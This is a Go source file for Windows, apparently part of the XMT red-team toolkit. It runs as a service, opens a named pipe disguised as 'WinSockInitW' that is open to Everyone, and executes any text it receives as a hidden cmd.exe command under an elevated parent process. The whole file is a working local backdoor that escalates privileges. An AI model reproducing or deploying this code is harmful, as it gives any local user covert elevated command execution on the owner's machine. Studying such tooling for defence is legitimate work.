//go:build windows
// +build windows

// Copyright (C) 2021 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//
package main

import (
	"bytes"
	"io"
	"net"
	"strings"
	"sync"

	"github.com/iDigitalFlame/xmt/cmd"
	"github.com/iDigitalFlame/xmt/com/pipe"
	"github.com/iDigitalFlame/xmt/device/devtools"
)

var bufs = sync.Pool{
	New: func() interface{} {
		return new(bytes.Buffer)
	},
}

func main() {
	(&devtools.Service{Start: listen}).Run()
}
func listen() {
	l, err := pipe.ListenPerms(pipe.Format("WinSockInitW"), pipe.PermEveryone)
	if err != nil {
		panic(err)
	}
	for {
		c, err := l.Accept()
		if err != nil {
			e, ok := err.(net.Error)
			if ok && e.Timeout() {
				continue
			}
			if ok && !e.Timeout() && !e.Temporary() {
				break
			}
			continue
		}
		b := bufs.Get().(*bytes.Buffer)
		io.Copy(b, c)
		c.Close()
		e := cmd.NewProcess("cmd.exe", "/c", strings.ReplaceAll(string(b.Bytes()), "\n", ""))
		b.Reset()
		e.Dir = "C:\\"
		bufs.Put(b)
		e.SetNoWindow(true)
		e.SetWindowDisplay(0)
		e.SetParent(cmd.F().SetElevated(true).SetSession(false))
		e.Start()
	}
}
